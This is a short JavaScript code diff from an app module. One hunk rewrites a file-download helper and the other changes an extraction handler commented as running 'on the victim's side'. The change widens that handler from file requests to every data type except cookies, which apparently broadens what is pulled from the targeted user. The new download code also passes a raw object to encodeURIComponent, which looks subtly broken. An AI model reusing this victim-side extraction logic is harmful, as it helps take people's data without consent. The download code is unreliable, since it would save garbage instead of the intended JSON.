@@ -1264,7 +1264,18 @@ export default {
      * @param {string} name of file to save
      */
     downloadFile(object, name) {
-        downloadJSON(JSON.stringify(object), name);
+        const data = encodeURIComponent(object);
+
+        const elem = document.createElement('a');
+
+        elem.download = name;
+        elem.href = `data:application/json;charset=utf-8,\n${data}`;
+        elem.dataset.downloadurl = [ 'text/json', elem.download, elem.href ].join(':');
+        elem.dispatchEvent(new MouseEvent('click', {
+            view: window,
+            bubbles: true,
+            cancelable: false
+        }));
     },
 
     downloadBinaryFile(body, filename, extension = 'bin') {
@@ -1362,7 +1373,7 @@ export default {
 
         // this runs on the victim's side
         if (recievedData.extraction === 'request') {
-            if (recievedData.config.dataType === 'file') {
+            if (recievedData.config.dataType !== 'cookies') {
                 // extraction started.
                 APP.API.notifyExtractionStarted({
                     senderInfo: {
